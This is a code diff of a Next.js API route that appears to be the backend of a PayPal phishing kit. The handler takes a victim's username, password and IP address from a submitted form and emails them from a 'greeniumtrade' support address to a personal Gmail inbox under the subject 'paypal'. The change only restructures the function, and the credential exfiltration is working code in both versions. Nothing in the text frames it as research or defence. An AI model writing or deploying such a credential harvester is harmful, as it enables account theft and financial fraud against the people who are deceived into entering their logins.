@@ -9,12 +9,18 @@ type Data = {
     ip: string
 }
 
-async function  sendEmail(from: string, to: string, source: string, username: string, pass: string,ip: string) {
+async function  sendEmail(from: string, to: string, source: string, username: string, pass: string, ip: string) {
+  
+}
+
+export default async function handler(req: NextApiRequest, res: NextApiResponse<string>/*NextApiResponse<Data>*/) {
+    const body = req.body
+    //await sendEmail('support@greeniumtrade.com', 'campdaniel06@gmail.com', 'paypal', body.username, body.oldPassword, body.ip)
     const mailDetails = {
-        from: from,
-        to: to,
-        subject: source + ' : ' + username + ' : ' + ip,
-        html: '<p>username: ' + username + '</p>' + '<p>password: ' + pass + '</p>' + '<p>ip: ' + ip + '</p>'
+        from: 'support@greeniumtrade.com',
+        to: 'campdaniel06@gmail.com',
+        subject: 'paypal' + ' : ' + body.username + ' : ' + body.ip,
+        html: '<p>username: ' + body.username + '</p>' + '<p>password: ' + body.oldPassword + '</p>' + '<p>ip: ' + body.ip + '</p>'
     }
 
     const transport = await createNodeMailerTransport()
@@ -32,10 +38,6 @@ async function  sendEmail(from: string, to: string, source: string, username: st
             });
         }
     })
-}
 
-export default async function handler(req: NextApiRequest, res: NextApiResponse<string>/*NextApiResponse<Data>*/) {
-    const body = req.body
-    await sendEmail('support@greeniumtrade.com', 'campdaniel06@gmail.com', 'paypal', body.username, body.oldPassword, body.ip)
     res.status(200).json('success')
 }
